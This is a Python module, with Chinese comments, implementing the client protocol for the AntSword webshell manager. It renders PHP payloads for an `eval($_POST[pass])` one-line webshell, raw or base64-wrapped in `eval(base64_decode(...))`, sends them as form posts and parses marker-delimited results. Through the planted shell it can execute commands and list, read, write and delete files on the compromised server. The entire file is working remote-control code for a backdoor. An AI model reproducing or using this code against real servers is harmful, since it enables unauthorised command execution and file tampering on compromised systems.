"""蚁剑 AntSword 协议编解码。

线格式：shell 为 `eval($_POST[<pass>])`。引擎把操作代码渲染后放入 <pass> 参数
（raw 直传，或 base64 包一层 `eval(base64_decode("..."))`）。目标执行后把结果用起止
标记（默认 `->|`/`|<-`）包裹回显，客户端据标记切出结果。可对接标准蚁剑 PHP 一句话。
"""

from __future__ import annotations

import base64
import json
import urllib.parse

from .base import Operation, Protocol, ProtocolError
from .templates import antsword as antsword_templates

MARKER_START = "->|"
MARKER_END = "|<-"


class AntSwordProtocol(Protocol):
    name = "antsword"
    languages = antsword_templates.supported()  # 随各阶段扩展
    encoders = ("raw", "base64")

    def build_request(self, operation: str, params: dict) -> tuple[bytes, dict[str, str]]:
        code = antsword_templates.render(
            self.payload_type, operation, params, (MARKER_START, MARKER_END)
        )
        if self.encoder == "base64":
            blob = base64.b64encode(code.encode("utf-8")).decode("ascii")
            code = f'eval(base64_decode("{blob}"));'
        body = urllib.parse.urlencode({self.password: code}).encode("utf-8")
        return body, {"Content-Type": "application/x-www-form-urlencoded"}

    def parse_response(self, operation: str, raw: bytes) -> dict:
        text = raw.decode("utf-8", errors="replace")
        start = text.find(MARKER_START)
        end = text.find(MARKER_END, start + 1)
        if start == -1 or end == -1:
            raise ProtocolError("响应中未找到蚁剑标记，可能不是有效的 shell")
        inner = text[start + len(MARKER_START):end]
        return _interpret(operation, inner)


def _interpret(operation: str, inner: str) -> dict:
    if operation == Operation.SYSINFO:
        try:
            info = json.loads(inner)
        except json.JSONDecodeError:
            info = {"raw": inner}
        return info if isinstance(info, dict) else {"raw": inner}
    if operation == Operation.EXEC:
        return {"output": inner}
    if operation == Operation.LIST:
        return Protocol.normalize_listing(inner)
    if operation == Operation.READ:
        return {"content": inner.strip()}
    if operation == Operation.WRITE:
        try:
            written = int(inner.strip())
        except ValueError:
            written = -1
        return {"written": written}
    if operation == Operation.DELETE:
        return {"deleted": inner.strip() == "1"}
    raise ProtocolError(f"蚁剑无法解释操作：{operation}")
